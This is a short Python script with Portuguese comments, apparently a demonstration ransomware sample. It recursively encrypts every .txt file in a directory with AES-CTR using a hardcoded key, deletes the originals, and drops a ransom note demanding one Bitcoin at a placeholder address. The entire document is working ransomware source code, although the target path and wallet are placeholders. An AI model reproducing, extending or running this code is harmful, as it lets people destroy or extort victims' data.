import os
import pyaes

def encrypt_file(file_path, key):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_path, "rb") as file:
            file_data = file.read()

        # Instanciar o AES com a chave
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar os dados do arquivo
        crypto_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado com uma nova extensão
        encrypted_file_path = file_path + ".encrypted"
        with open(encrypted_file_path, "wb") as new_file:
            new_file.write(crypto_data)

        # Remover o arquivo original
        os.remove(file_path)

        print(f"Arquivo {file_path} encriptado com sucesso!")

    except Exception as e:
        print(f"Erro ao encriptar o arquivo {file_path}: {e}")

def encrypt_directory(directory, key):
    # Verificar se o diretório existe
    if not os.path.isdir(directory):
        print(f"Erro: O diretório {directory} não existe.")
        return

    try:
        # Percorrer todos os arquivos no diretório
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(".txt"):
                    file_path = os.path.join(root, file)
                    encrypt_file(file_path, key)

        # Criar um arquivo de resgate típico de ransomware
        ransom_note = """
        Seus arquivos foram encriptados!
        Para recuperar seus arquivos, envie 1 Bitcoin para o endereço XYZ.
        """
        ransom_note_path = os.path.join(directory, "README_FOR_DECRYPT.txt")
        with open(ransom_note_path, "w") as ransom_file:
            ransom_file.write(ransom_note)

        print("Arquivos encriptados")

    except Exception as e:
        print(f"Erro ao encriptar o diretório {directory}: {e}")

if __name__ == "__main__":
    # Definir a chave de criptografia
    key = b"testeransomwares"

    # Diretório a ser encriptado
    directory = "caminho/para/a/pasta"

    # Chamar a função para encriptar o diretório
    encrypt_directory(directory, key)
